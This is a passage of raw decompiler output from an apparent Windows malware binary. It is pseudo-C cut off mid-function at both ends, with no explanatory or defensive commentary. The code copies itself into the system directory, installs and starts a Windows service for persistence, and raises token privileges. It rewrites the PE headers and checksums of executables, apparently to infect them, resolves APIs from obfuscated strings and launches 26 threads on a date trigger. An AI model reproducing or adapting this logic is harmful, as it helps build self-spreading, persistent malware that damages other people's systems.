	if ((dwLoc08 & 0x00) == 0x00)
	{
		*(fp - 1316) = esi;
		*(fp - 0x0528) = 0x0104;
		*(fp - 0x052C) = fp - 0x0520;
		GetSystemDirectoryA(*(fp - 0x052C), *(fp - 0x0528));
		int32 esi_156 = 0x00;
		do
		{
			*(fp - 0x1C) = *(fp - 0x1C) & 0x00;
			*(fp - 0x0528) = 0x0040F769;
			*(fp - 0x052C) = fp - 0x1C;
			word32 edi_76;
			fn00407370(dwArg00, out edi_76);
			*(fp - 0x0528) = 0x04;
			*(fp - 0x052C) = 0x04;
			*(fp - 0x0530) = 0x02;
			*(fp - 1332) = fp - 0x1C;
			byte dl_91;
			*(fp - 1332) = (word32) fn00407460(dwArg00, out dl_91) + (fp - 0x1C);
			fn00403624(ebx, dwArg04, dwArg08);
			*(fp - 1336) = fp - 0x1B;
			fn0040C5CC(fp - 0x04, dwArg00);
			*(fp - 0x053C) = fp - 0x0520;
			*(fp - 0x0540) = fp - 0x041C;
			word32 edi_109;
			fn00407370(dwArg00, out edi_109);
			*(fp - 0x0544) = 0x0040E044;
			*(fp - 0x0548) = fp - 0x041C;
			fn00407380(dwArg00);
			*(fp - 0x054C) = fp - 0x1C;
			*(fp - 0x0550) = fp - 0x041C;
			fn00407380(dwArg00);
			*(fp - 0x0554) = 4256220;
			*(fp - 0x0558) = fp - 0x041C;
			fn00407380(dwArg00);
			*(fp - 0x055C) = fp - 0x041C;
			if (fn00403D58(dwArg00) == 0x00)
				break;
			esi_156 = esi_156 + 0x01;
		} while (esi_156 < 0x0A);
		*(fp - 0x0528) = fp - 0x1C;
		*(fp - 0x052C) = 4790644;
		fn00407380(dwArg00);
		*(fp - 0x0530) = fp - 0x041C;
		*(fp - 1332) = 4791164;
		word32 edi_150;
		fn00407370(dwArg00, out edi_150);
	}
	*(fp - 1316) = 0x01;
	return ebx;
}

// 00404AFC: Register word32 fn00404AFC(Register ptr32 ebp, Register out ptr32 ediOut)
word32 fn00404AFC(ptr32 ebp, ptr32 & ediOut)
{
	word32 edi_16;
	fn00407370(fp - 0x0310, out edi_16);
	Eq_5 ecx_22 = *(fp - 0x041C);
	*(fp - 0x041C) = 0x0104;
	*(fp - 0x0420) = fp - 0x0108;
	*(fp - 0x0424) = 0x00;
	GetModuleFileNameA(*(fp - 0x0424), *(fp - 0x0420), *(fp - 0x041C));
	*(fp - 0x041C) = 0x00;
	*(fp - 0x0420) = 0x00;
	*(fp - 0x0424) = fp - 0x0414;
	*(fp - 0x0428) = 0x00;
	*(fp - 0x042C) = fp - 0x0310;
	Eq_5 ecx_52 = fn004074DB(ecx_22, dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10);
	*(fp - 0x0430) = 0x00;
	*(fp - 0x0434) = 0x00;
	*(fp - 1080) = fp - 0x020C;
	*(fp - 0x043C) = 0x00;
	*(fp - 0x0440) = fp - 0x0108;
	Eq_5 ecx_65 = fn004074DB(ecx_52, dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10);
	*(fp - 0x0444) = fp - 0x020C;
	*(fp - 0x0448) = fp - 0x0414;
	return 0x00 - (-fn0040C540(ecx_65, dwArg00, dwArg04) == 0x00) + 0x01;
}

// 00404B78: Register ui32 fn00404B78(Stack (ptr32 Eq_1853) dwArg04, Stack uint32 dwArg08)
ui32 fn00404B78(Eq_1853 * dwArg04, uint32 dwArg08)
{
	if (dwArg08 < 0x44 || (dwArg04->w0000 != 77 || dwArg04->b0001 != 0x5A))
		return 0x00;
	word32 * eax_41 = dwArg04 + (word32) dwArg04[0x001E] / 0x02;
	uint32 edx_44 = eax_41 - dwArg04;
	if (edx_44 > dwArg08 + ~0x03)
		return 0x00;
	return ~(0x00 - (0x4550 - *eax_41 == 0x00)) & edx_44;
}

// 00404BB7: Register (ptr32 Eq_2900) fn00404BB7(Stack (ptr32 Eq_1853) dwArg04, Stack uint32 dwArg08, Stack uint32 dwArg0C)
Eq_2900 * fn00404BB7(Eq_1853 * dwArg04, uint32 dwArg08, uint32 dwArg0C)
{
	struct Eq_2900 * eax_39;
	ptr32 eax_23 = fn00404B78(dwArg04, dwArg0C);
	if (eax_23 != 0x00)
	{
		struct Eq_2912 * ecx_61 = dwArg04 + eax_23 / 0x02;
		uint32 edx_65 = ecx_61->dw0074;
		if (edx_65 >= dwArg08)
		{
			up32 ecx_69 = (word32) ecx_61->w0006;
			up32 esi_70 = ecx_61->a0070[dwArg08].dw0000;
			up32 edi_100 = 0x00;
			eax_39 = (struct Eq_2900 *) ((char *) (&ecx_61->dw0074 + 0x03 + (edx_65 * 0x08) / 0x0078) + 0x04);
			if (!DPB(CZ, false, 0))
			{
				do
				{
					if (eax_39 - dwArg04 >= dwArg0C + ~0x03)
						goto l00404C20;
					up32 edx_88 = eax_39->dw0000;
					if (eax_39->dw0000 + edx_88 > esi_70 && edx_88 <= esi_70)
						break;
					eax_39 = eax_39 + 0x01;
					edi_100 = edi_100 + 0x01;
				} while (edi_100 < ecx_69);
				if (edi_100 < ecx_69)
					return eax_39;
			}
		}
	}
l00404C20:
	eax_39 = null;
	return eax_39;
}

// 00404E60: void fn00404E60(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08)
void fn00404E60(Eq_5 dwArg04, Eq_5 dwArg08)
{
	fn0040174B();
	word32 esi_15 = 0x00;
	word32 ecx_28;
	struct Eq_1853 * eax_29 = fn0040174E(fp - 0x18, dwArg04, fp - 0x08, 0x00, out ecx_28);
	if (eax_29 == null)
		return;
	Eq_5 edi_127;
	ptr32 eax_74 = fn00404B78(eax_29, dwLoc08);
	if (eax_74 != 0x00)
	{
		struct Eq_2988 * eax_136 = fn00404BB7(eax_29, 0x03, dwLoc08);
		if (eax_136 != null)
		{
			struct Eq_2995 * esi_143 = eax_29 + eax_74 / 0x02;
			esi_143->dw008C = 0x10;
			word32 ecx_147 = eax_136->dw0004;
			eax_136->dw0000 = 0x10;
			eax_136->dw0008 = 0x10;
			ui32 ecx_148 = ecx_147 + 0x10;
			if (((word16) (ecx_147 + 0x10) & 0x0FFF) != 0x00)
				ecx_148 = (ecx_147 + 0x10 >> 0x0C) + 0x01 << 0x0C;
			esi_143->dw0050 = ecx_148;
			word32 ecx_157 = eax_136->dw000C;
			edi_127 = eax_136->dw0008 + ecx_157;
			cui16 di_161 = (word16) edi_127;
			if (edi_127 < dwArg08)
			{
				edi_127 = dwArg08;
				di_161 = (word16) dwArg08;
			}
			if ((di_161 & 0x0FFF) != 0x00)
				edi_127 = (edi_127 >> 0x0C) + 0x01 << 0x0C;
			Eq_5 eax_172 = eax_29 + ecx_157 / 0x02;
			if (eax_172 - eax_29 < 0x10)
				fn00407310(eax_172, 0x00, 0x10);
			word32 eax_184 = esi_143->dw00EC;
			if (eax_184 != 0x00)
				esi_143->dw0028 = eax_184;
			esi_15 = 0x01;
l00404F29:
			fn00401808(fp - 0x18);
			if (esi_15 != 0x00)
				fn00403F63(dwArg04, edi_127);
			fn00404FA3(dwArg04);
			return;
		}
	}
	edi_127 = dwArg04;
	goto l00404F29;
}

// 00404F50: Register uint32 fn00404F50(Stack (ptr32 Eq_1853) dwArg04, Stack uint32 dwArg08)
uint32 fn00404F50(Eq_1853 * dwArg04, uint32 dwArg08)
{
	uint32 ecx_11 = 0x00;
	uint32 dwLoc08_16 = 0x00;
	if (dwArg08 >> 0x01 != 0x00)
	{
		struct Eq_1853 * edx_43 = dwArg04;
		uint32 esi_47 = dwArg08 >> 0x01;
		do
		{
			uint32 ecx_53 = ecx_11 + (word32) edx_43->w0000;
			ecx_11 = (ecx_53 & 0xFFFF) + (ecx_53 >> 0x10);
			edx_43 = edx_43 + 0x01;
			esi_47 = esi_47 - 0x01;
		} while (esi_47 != 0x00);
		dwLoc08_16 = ecx_11;
	}
	uint32 eax_28 = ecx_11 >> 0x10;
	return DPB(eax_28, (word16) (eax_28 + dwLoc08_16), 0) + dwArg08;
}

// 00404FA3: void fn00404FA3(Stack Eq_5 dwArg04)
void fn00404FA3(Eq_5 dwArg04)
{
	fn0040174B();
	word32 ecx_32;
	struct Eq_1853 * eax_33 = fn0040174E(fp - 0x18, dwArg04, fp - 0x08, 0x00, out ecx_32);
	if (eax_33 != null)
	{
		ptr32 eax_58 = fn00404B78(eax_33, dwLoc08 & 0x00);
		if (eax_58 != 0x00)
		{
			ui32 * esi_79 = eax_33 + (eax_58 + 88) / 0x02;
			if (eax_33[(eax_58 + 88) / 0x02] != 0x00)
			{
				*esi_79 = *esi_79 & 0x00;
				*esi_79 = fn00404F50(eax_33, dwLoc08 & 0x00);
			}
		}
		fn00401808(fp - 0x18);
	}
}

// 004052D3: void fn004052D3(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08)
void fn004052D3(Eq_5 dwArg04, Eq_5 dwArg08)
{
	Eq_5 eax_17 = dwArg04;
	if (dwArg04 == 0x00)
		eax_17 = GetCurrentProcess();
	if (OpenProcessToken(eax_17, 0x28, fp + 0x04) != 0x00)
	{
		if (LookupPrivilegeValueA(0x00, dwArg08, fp - 0x10) != 0x00)
		{
			AdjustTokenPrivileges(dwArg04, 0x00, fp - 0x24, 0x10, fp - 0x0664, fp - 0x14);
			if (GetLastError() == 0x00)
			{
				AdjustTokenPrivileges(dwArg04, 0x00, fp - 0x0664, 0x10, null, null);
				GetLastError() != 0x00;
			}
		}
		CloseHandle(dwArg04);
	}
}

// 004053AC: Register word32 fn004053AC(Register word32 ebp, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn004053AC(word32 ebp, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	fn00404687(0x01);
	fn00407310(0x00491D84, 0x00, 0x0104);
	fn00407310(4791424, 0x00, 0x0104);
	fn00407310(4791164, 0x00, 0x0104);
	fn00407310(4790904, 0x00, 0x0104);
	fn00407310(4790644, 0x00, 0x0104);
	fn00403529(0x0040E0D4, 0x1EAC, &globals->t40E0D0, 0x00);
	word32 esi_80;
	Eq_5 edi_81;
	Eq_5 ebx_82 = fn00402642(&globals->t491E90, out esi_80, out edi_81);
	Eq_5 eax_84 = GetVersion();
	globals->t491E98 = edi_81;
	globals->t491E88 = eax_84 & 0x80000000;
	GetVersionExA(fp - 0x98);
	if (dwLoc94 == 0x05 && dwLoc90 == ebx_82)
		globals->t491E98 = ebx_82;
	word32 eax_111;
	byte * edi_97;
	word32 ebx_98 = fn004048CB(ebx_82, fp - 0x04, esi_80, out edi_97);
	*(fp - 0xAC) = 0x0007D000;
	byte * eax_103 = fn00407BAF(dwArg00);
	globals->ptr491970 = eax_103;
	if (eax_103 == edi_97)
		eax_111 = 0x00;
	else
	{
		*(fp - 0xAC) = 0x0007D000;
		*(fp - 0xB0) = (byte **) edi_97;
		*(fp - 0xB4) = (byte **) eax_103;
		fn00407310(dwArg00, bArg04, dwArg08);
		fn0040556C(ebx_98);
		*(fp - 0xB8) = ebx_98;
		*(fp - 188) = 0x0040FDE0;
		*(fp - 0xC0) = (union Eq_5 *) fn00403434(dwArg00, dwArg04);
		*(fp - 0xC4) = (byte **) edi_97;
		fn004052D3(dwArg00, dwArg04);
		eax_111 = ebx_98;
	}
	word32 edi_115;
	*ediOut = *(fp - 0xA8);
	word32 esi_117;
	*esiOut = *(fp - 0xA4);
	word32 ebx_119;
	*ebxOut = *(fp - 0xA0);
	return eax_111;
}

// 004054B3: void fn004054B3(Register ptr32 ebp, Stack Eq_5 dwArg04, Stack Eq_5 dwArg08)
void fn004054B3(ptr32 ebp, Eq_5 dwArg04, Eq_5 dwArg08)
{
	fn0040174B();
	ptr32 ebp_129 = fp - 0x04;
	word32 ecx_22;
	struct Eq_1853 * eax_23 = fn0040174E(fp - 0x18, dwArg04, fp - 0x08, 0x00, out ecx_22);
	if (eax_23 != null)
	{
		up32 esi_138 = 0x1014;
		if (dwLoc08 >= 0x1000)
		{
			byte dl_106;
			Eq_5 eax_107 = fn00407460(dwArg08, out dl_106);
			if (dwLoc08 > 4294962200)
			{
				do
				{
					if (fn00408040(dwArg08, eax_23 + esi_138 / 0x02, eax_107) == 0x00)
					{
						Eq_5 edi_157 = eax_23 + (esi_138 + 0x00) / 0x02;
						fn00403529(edi_157, 0x1EAC, edi_157 - 0x04, SLICE(edi_157 - 0x04, byte, 24));
						word32 esi_176;
						word32 edi_177;
						ebp_129 = fn00407820(edi_157, (word32) dwArg08 + 0x0014, 0x1EAC, out esi_176, out edi_177);
						word32 edi_181;
						word32 esi_182 = fn00403496(esi_176, out edi_181);
						*(fp - 0x44) = edi_157 - 0x04;
						*(fp - 0x48) = esi_182;
						*(fp - 0x4C) = edi_181;
						fn004034CD(dwArg00, dwArg04, dwArg08, bArg0B);
						break;
					}
					esi_138 = esi_138 + 0x01;
				} while (esi_138 < dwLoc08 + ~0x03E7);
			}
			*(fp - 0x28) = 0x01;
		}
		fn00401808(ebp_129 - 0x14);
	}
}

// 0040556C: void fn0040556C(Register word32 ebx)
void fn0040556C(word32 ebx)
{
	Eq_5 eax_26 = LoadLibraryA(fn00403434(0x0040FB6F, 0x02));
	if (eax_26 != 0x00)
	{
		globals->t491EA0 = GetProcAddress(eax_26, fn00403434(0x0040FC6F, 0x01));
		globals->t491E9C = GetProcAddress(eax_26, fn00403434(0x0040FC6F, 0x04));
		globals->t491EA4 = GetProcAddress(eax_26, fn00403434(0x0040FC6F, 0x05));
	}
	ptr32 esp_130;
	fn00403434(0x0040FB6F, 0x03);
	Eq_5 eax_51 = LoadLibraryA(*esp_43);
	if (eax_51 != 0x00)
	{
		*(esp_130 - 0x04) = 0x03;
		*(esp_130 - 0x08) = 0x0040FC6F;
		Eq_5 eax_121 = fn00403434(dwArg00, dwArg04);
		*(esp_130 - 0x04) = (union Eq_5 *) eax_121;
		*(esp_130 - 0x08) = (union Eq_5 *) eax_51;
		word32 ebx_131;
		word32 ebp_132;
		word32 esi_133;
		word32 edi_134;
		word32 ecx_135;
		word32 eax_136;
		byte SZO_137;
		bool C_138;
		bool Z_139;
		esi_48();
		globals->dw491EA8 = eax_136;
	}
	word32 * esp_61 = esp_130 - 0x04;
	*esp_61 = 0x0040FDA4;
	ptr32 esp_63;
	word32 ebx_64;
	word32 ebp_65;
	<anonymous> * esi_66;
	word32 edi_67;
	word32 ecx_68;
	word32 eax_69;
	byte SZO_70;
	bool C_71;
	bool Z_72;
	ebx_46();
	if (eax_69 != 0x00)
	{
		*(esp_63 - 0x04) = 0x01;
		*(esp_63 - 0x08) = 0x0040FDA4;
		Eq_5 eax_97 = fn00403434(dwArg00, dwArg04);
		*(esp_63 - 0x04) = (union Eq_5 *) eax_97;
		*(esp_63 - 0x08) = eax_69;
		word32 esp_106;
		word32 ebx_107;
		word32 ebp_108;
		word32 esi_109;
		word32 edi_110;
		word32 ecx_111;
		word32 eax_112;
		byte SZO_113;
		bool C_114;
		bool Z_115;
		esi_66();
		globals->dw491EAC = eax_112;
	}
}

// 004058B1: Register word32 fn004058B1(Register ptr32 ebp, Stack Eq_5 dwArg04, Register out ptr32 ediOut)
word32 fn004058B1(ptr32 ebp, Eq_5 dwArg04, ptr32 & ediOut)
{
	*ediOut = edi;
	word32 eax_167;
	fn0040174B();
	Eq_5 ecx_27;
	struct Eq_1853 * eax_28 = fn0040174E(fp - 0x1C, dwArg04, fp - 0x0C, 0x01, out ecx_27);
	if (eax_28 != null)
	{
		fn004074DB(ecx_27, dwArg04, fp - 288, fp - 0x0224, fp - 808, 0x00);
		fn00407380(fp - 288);
		*(fp - 844) = fp - 808;
		*(fp - 848) = fp - 288;
		fn00407380(dwArg00);
		*(fp - 0x0354) = 4256216;
		*(fp - 0x0358) = fp - 288;
		fn00407380(dwArg00);
		*(fp - 0x035C) = 4256220;
		*(fp - 0x0360) = fp - 288;
		word32 edi_116;
		*ediOut = fn00407380(dwArg00);
		*(fp - 868) = fp - 0x08;
		*(fp - 0x0368) = dwLoc0C;
		*(fp - 0x036C) = (struct Eq_1853 **) eax_28;
		word32 eax_127 = fn00407196(dwArg00, dwArg04, dwArg08);
		if (eax_127 != 0x00)
		{
			fn00401808(fp - 0x1C);
			*(fp - 0x0330) = dwLoc08 & 0x00;
			*(fp - 0x0334) = eax_127;
			*(fp - 0x0338) = fp - 288;
			fn00403CBB(dwArg00, dwArg04, dwArg08);
			*(fp - 0x033C) = eax_127;
			word32 edi_144;
			word32 ebp_145 = fn0040780B(fp - 0x04, dwArg00, out edi_144);
			*(fp - 0x0330) = (union Eq_5 *) GetCommandLineA();
			*(fp - 0x0334) = ebp_145 - 0x011C;
			word32 esi_147 = 0x00;
			word32 eax_156 = fn004046B3(dwArg00, dwArg04);
			if (eax_156 != 0x00)
			{
				*(fp - 0x0330) = ~0x00;
				*(fp - 0x0334) = eax_156;
				WaitForSingleObject(*(fp - 0x0334), *(fp - 0x0330));
				*(fp - 0x0330) = ebp_145 - 0x011C;
				fn00403DFA(dwArg00);
				*(fp - 0x0330) = 0x01;
				esi_147 = *(fp - 0x0330);
			}
			eax_167 = esi_147;
			return eax_167;
		}
		fn00401808(fp - 0x1C);
	}
	eax_167 = 0x00;
	return eax_167;
}

// 00406820: Register word32 fn00406820(Register word32 ebx, Register word32 ebp, Register word32 esi, Register word32 edi)
word32 fn00406820(word32 ebx, word32 ebp, word32 esi, word32 edi)
{
	fn00407B80(0x1FC8, dwLoc04);
	GetModuleFileNameA(0x00, fp + 0x04, 0x0104);
	SetFileAttributesA(4791164, 0x20);
	Eq_94 eax_42 = CopyFileA(fp + 0x04, 4791164, 0x00);
	SetFileAttributesA(4791164, 0x20);
	word32 esi_28 = 4791164;
	ptr32 esp_311 = fp - 0x10;
	if (eax_42 != 0x00)
	{
		word32 edi_283;
		fn004054B3(fn00407820(dwArg00, dwArg04, dwArg08, out esi_28, out edi_283), dwArg00, dwArg04);
		fn00404E60(dwArg00, dwArg04);
		fn00404687(dwArg00);
		fn00403F63(dwArg00, dwArg04);
		esp_311 = fp - 0x14;
	}
	Eq_5 ebx_251;
	Eq_5 esi_249;
	struct Eq_3932 * esp_257;
	union Eq_5 * esp_57 = esp_311 - 0x04;
	*esp_57 = (union Eq_5 *) 0x27;
	*(esp_57 - 0x04) = esi_28;
	SetFileAttributesA(*(esp_57 - 0x04), *esp_57);
	if (globals->t491E88 != ebx_251)
	{
		*(esp_257 - 0x04) = (union Eq_5 *) esi_249;
		*(esp_257 - 0x08) = 4790644;
		*(esp_257 - 0x0C) = 4790904;
		*(esp_257 - 0x10) = 0x80000002;
		fn0040451C(dwArg00, dwArg04, dwArg08, dwArg0C);
		*(esp_257 - 0x14) = 0x01;
		*(esp_257 - 0x18) = 0x0040FB6F;
		*(esp_257 - 0x04) = (union Eq_5 *) fn00403434(dwArg00, dwArg04);
		Eq_5 eax_231 = LoadLibraryA(*(esp_257 - 0x04));
		*(esp_257 - 0x04) = 0x0040FC6F;
		*(esp_257 - 0x08) = (union Eq_5 *) eax_231;
		Eq_5 ebp_233 = eax_231;
		Eq_5 eax_238 = GetProcAddress(*(esp_257 - 0x08), *(esp_257 - 0x04));
		struct Eq_3932 * esp_239 = esp_257;
		if (eax_238 != ebx_251)
		{
			*(esp_257 - 0x04) = 0x01;
			*(esp_257 - 0x08) = (union Eq_5 *) ebx_251;
			eax_238();
			esi_249.u0 = <invalid>;
			ebp_233.u0 = (union Eq_12599 *) <invalid>;
			ebx_251.u0 = (union Eq_12599 *) <invalid>;
			esp_239 = esp_257 - 0x08;
		}
		union Eq_5 * esp_254 = esp_239 - 0x04;
		*esp_254 = (union Eq_5 *) ebp_233;
		FreeLibrary(*esp_254);
		esp_257 = (struct Eq_3932 *) ((char *) esp_254 + 0x04);
	}
	if (esp_257->t0010 != ebx_251)
	{
		if (globals->t491E88 != ebx_251)
		{
			union Eq_5 * esp_122 = esp_257 - 0x04;
			*esp_122 = (union Eq_5 *) ebx_251;
			*(esp_122 - 0x04) = (union Eq_5 *) esi_249;
			fn004046B3(dwArg00, dwArg04);
		}
		else if (globals->t491E90 == ebx_251)
		{
			struct Eq_4117 * esp_136 = esp_257 - 0x04;
			esp_136->t0000.u0 = 0x02;
			*(esp_136 - 0x04) = (union Eq_5 *) ebx_251;
			*(esp_136 - 0x08) = (union Eq_5 *) ebx_251;
			Eq_5 eax_142 = OpenSCManagerA(*(esp_136 - 0x08), *(esp_136 - 0x04), esp_136->t0000);
			esp_136->t0000 = ebx_251;
			*(esp_136 - 0x04) = (union Eq_5 *) ebx_251;
			*(esp_136 - 0x08) = (union Eq_5 *) ebx_251;
			*(esp_136 - 0x0C) = (union Eq_5 *) ebx_251;
			*(esp_136 - 0x10) = (union Eq_5 *) ebx_251;
			*(esp_136 - 0x14) = (union Eq_5 *) esi_249;
			*(esp_136 - 0x18) = (union Eq_5 *) ebx_251;
			*(esp_136 - 0x1C) = 0x02;
			*(esp_136 - 0x20) = 0x0110;
			*(esp_136 - 0x24) = (union Eq_5 *) ebx_251;
			*(esp_136 - 0x28) = 4790644;
			*(esp_136 - 44) = 4790644;
			*(esp_136 - 0x30) = (union Eq_5 *) eax_142;
			esp_136->t0014 = eax_142;
			CreateServiceA(*(esp_136 - 0x30), *(esp_136 - 44), *(esp_136 - 0x28), *(esp_136 - 0x24), *(esp_136 - 0x20), *(esp_136 - 0x1C), *(esp_136 - 0x18), *(esp_136 - 0x14), *(esp_136 - 0x10), *(esp_136 - 0x0C), *(esp_136 - 0x08), *(esp_136 - 0x04), esp_136->t0000);
			esp_136->t0000 = esp_136->t0014;
			CloseServiceHandle(esp_136->t0000);
			esp_136->t0000.u0 = 0x01;
			*(esp_136 - 0x04) = (union Eq_5 *) ebx_251;
			*(esp_136 - 0x08) = (union Eq_5 *) ebx_251;
			Eq_5 eax_185 = OpenSCManagerA(*(esp_136 - 0x08), *(esp_136 - 0x04), esp_136->t0000);
			esp_136->t0000.u0 = 0x10;
			*(esp_136 - 0x04) = 4790644;
			*(esp_136 - 0x08) = (union Eq_5 *) eax_185;
			Eq_5 eax_194 = OpenServiceA(*(esp_136 - 0x08), *(esp_136 - 0x04), esp_136->t0000);
			esp_136->t0000 = ebx_251;
			*(esp_136 - 0x04) = (union Eq_5 *) ebx_251;
			*(esp_136 - 0x08) = (union Eq_5 *) eax_194;
			StartServiceA(*(esp_136 - 0x08), *(esp_136 - 0x04), esp_136->t0000);
			esp_136->t0000 = eax_194;
			CloseServiceHandle(esp_136->t0000);
			esp_136->t0000 = eax_185;
			CloseServiceHandle(esp_136->t0000);
		}
		*(esp_257 - 0x04) = 0x01;
	}
	return esp_257->dw0008;
}

// 00406D5E: Register word32 fn00406D5E(Register word32 ebp, Register word32 esi, Register out ptr32 ebpOut)
word32 fn00406D5E(word32 ebp, word32 esi, ptr32 & ebpOut)
{
	*ebpOut = ebp;
	word32 esi_21 = 0x01;
	do
	{
		*(fp - 0x08) = 0x01;
		*(fp - 0x0C) = esi_21;
		int32 esi_18;
		word32 ebx_19 = fn004013FA(ebp, esi_21, dwArg00, dwArg04, out esi_18);
		esi_21 = esi_18 + 0x01;
	} while (esi_18 < ~0x0BB6);
	return ebx_19;
}

// 00406D75: void fn00406D75()
void fn00406D75()
{
	ptr32 ebp_104 = fp - 0x04;
	void (* edi_108)(Eq_5) = Sleep;
	Eq_5 ebx_106 = 0x01;
	byte bl_111 = 0x01;
	word16 bx_116 = 0x01;
	ptr32 esp_103 = fp - 0x24;
	while (true)
	{
		union Eq_5 * esp_34 = esp_120 - 0x04;
		*esp_34 = (union Eq_5 *) 600000;
		Sleep(*esp_34);
		*esp_34 = (union Eq_5 *) (ebp_104 - 0x14);
		GetLocalTime(*esp_34);
		word16 ax_41 = *(ebp_104 - 0x12);
		esp_103 = (char *) esp_34 + 0x04;
		byte al_43 = (byte) ax_41;
		ptr32 esp_120 = esp_103;
		if ((bl_111 & al_43) != 0x00)
		{
			ptr32 esp_121 = esp_103;
			if (*(ebp_104 - 0x0E) == 0x06)
			{
				globals->t491E94 = globals->t491E94 & 0x00;
				globals->t491E98 = ebx_106;
				if (ax_41 == 0x07)
					globals->t491E94 = ebx_106;
				if (ax_41 == bx_116)
					globals->t491E94 = ebx_106;
				int32 esi_57 = 0x00;
				do
				{
					LPDWORD * esp_63 = esp_120 - 0x04;
					*esp_63 = (LPDWORD *) (ebp_104 - 0x04);
					*(esp_63 - 0x04) = 0x00;
					*(esp_63 - 0x08) = esi_57;
					*(esp_63 - 0x0C) = 4222236;
					*(esp_63 - 0x10) = 0x00;
					*(esp_63 - 0x14) = 0x00;
					Eq_5 eax_75 = CreateThread(*(esp_63 - 0x14), *(esp_63 - 0x10), *(esp_63 - 0x0C), *(esp_63 - 0x08), *(esp_63 - 0x04), *esp_63);
					esi_57 = esi_57 + 0x01;
				} while (esi_57 < 0x1A);
				*esp_63 = (LPDWORD *) (DWORD *) 1800000;
				ptr32 esp_82;
				word32 ebp_83;
				byte SCZO_84;
				word32 ebx_85;
				word32 esi_86;
				<anonymous> * edi_87;
				word32 eax_88;
				word16 ax_89;
				byte bl_90;
				byte al_91;
				byte SZO_92;
				bool C_93;
				bool Z_94;
				word16 bx_95;
				byte SO_96;
				edi_108();
				word32 ebp_97;
				word32 ebx_98 = fn00406D5E(ebp_83, esi_86, out ebp_97);
				*(esp_82 - 0x04) = ~0x00;
				byte SCZO_105;
				word32 esi_107;
				word32 eax_109;
				word16 ax_110;
				byte al_112;
				byte SZO_113;
				bool C_114;
				bool Z_115;
				byte SO_117;
				edi_87();
			}
		}
	}
}

// 00406F1C: void fn00406F1C()
void fn00406F1C()
{
	CreateThread(null, 0x00, &globals->t4015FF, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t406083, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t406801, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t405DFA, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t406DFB, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t4069F1, 0x00, 0x00, fp - 0x08);
	Eq_5 ebx_110 = 0x00;
	do
	{
		CreateThread(null, 0x00, &globals->t4069A4, ebx_110, 0x00, fp - 0x08);
		ebx_110 = ebx_110 + 0x01;
	} while (ebx_110 < 0x1A);
	fn00406D75();
}

// 0040700C: Register word32 fn0040700C(Register ptr32 ebp, Register out ptr32 ediOut)
word32 fn0040700C(ptr32 ebp, ptr32 & ediOut)
{
	ptr32 esp_13;
	word32 ebp_14;
	byte SCZO_15;
	word32 eax_16;
	byte SZO_17;
	bool C_18;
	bool Z_19;
	word32 ecx_20;
	word32 edi_21;
	word32 ebx_22;
	word32 esi_23;
	WS2_32.dll!Ordinal_115();
	word32 ebx_24;
	word32 esi_25;
	word32 edi_26;
	if (fn004053AC(ebp_14, out ebx_24, out esi_25, out edi_26) == 0x00)
		return 0x00;
	ptr32 ebp_44 = fn00406820(ebx_24, ebp_14, esi_25, edi_26);
	if (globals->b40F0D4 != 0x00)
	{
		*(esp_13 - 0x04) = 0x0040F0D4;
		word32 edi_78;
		if (fn004058B1(ebp_44, dwArg00, out edi_78) != 0x00)
			return 0x00;
	}
	if (globals->t491E90 != 0x00)
	{
		*(ebp_44 - 0x08) = *(ebp_44 - 0x08) & 0x00;
		*(ebp_44 - 0x04) = *(ebp_44 - 0x04) & 0x00;
		*(ebp_44 - 0x10) = 4790644;
		*(esp_13 - 0x04) = ebp_44 - 0x10;
		*(ebp_44 - 0x0C) = 4222957;
		StartServiceCtrlDispatcherA(*(esp_13 - 0x04));
	}
	word32 edi_56;
	if (fn00404AFC(ebp_44, out edi_56) != 0x00)
		fn00406F1C();
	return 0x00;
}

// 00407196: Register (ptr32 byte) fn00407196(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08, Stack Eq_5 dwArg0C)
byte * fn00407196(Eq_5 dwArg04, Eq_5 dwArg08, Eq_5 dwArg0C)
{
	byte * eax_42;
	ui32 eax_19 = *dwArg04;
	Eq_5 edx_162 = 0x00;
	uint32 dwLoc08_172 = 0x00;
	if (dwArg08 < (eax_19 << 0x03) + 0x04)
		eax_42 = null;
	else
	{
		Eq_4852 CZ_168 = DPB(CZ, false, 0);
		if (!CZ_168)
		{
			struct Eq_4863 * esi_165 = (word32) dwArg04 + 0x04 + 0x04;
			ui32 dwArg04_166 = eax_19;
			do
			{
				Eq_5 ecx_176 = esi_165->dw0000;
				if (edx_162 < ecx_176)
				{
					up32 ecx_199 = ecx_176 - edx_162;
					edx_162 = (word32) edx_162 + ecx_199;
					dwLoc08_172 = dwLoc08_172 + ecx_199;
				}
				word32 eax_184 = esi_165->dw0000;
				CZ_168 = DPB(CZ_168, false, 0);
				if (!CZ_168)
					edx_162 = (word32) edx_162 + eax_184;
				ui32 v15_192 = dwArg04_166 - 0x01;
				esi_165 = esi_165 + 0x01;
				dwArg04_166 = v15_192;
			} while (v15_192 != 0x00);
		}
		up32 eax_72 = dwArg08 - (eax_19 << 0x03);
		if (dwLoc08_172 < eax_72 + ~0x03)
			edx_162 = (word32) edx_162 + ((eax_72 + ~0x03) - dwLoc08_172);
		*dwArg0C = edx_162;
		byte * esi_104 = null;
		Eq_4926 dwLoc08_102[] = dwLoc08_172 & 0x00;
		eax_42 = fn00407BAF(edx_162);
		int32 edi_91 = (word32) dwArg04 + ((eax_19 << 0x03) + 0x04);
		ui32 ebx_128 = eax_19;
		if (!DPB(CZ_168, false, 0))
		{
			struct Eq_4916 * ecx_119 = (word32) dwArg04 + 0x04;
			do
			{
				while (esi_104 < ecx_119->dw0000)
				{
					Mem133[eax_42 + esi_104:byte] = Mem89[dwLoc08_102 + edi_91:byte];
					esi_104 = esi_104 + 0x01;
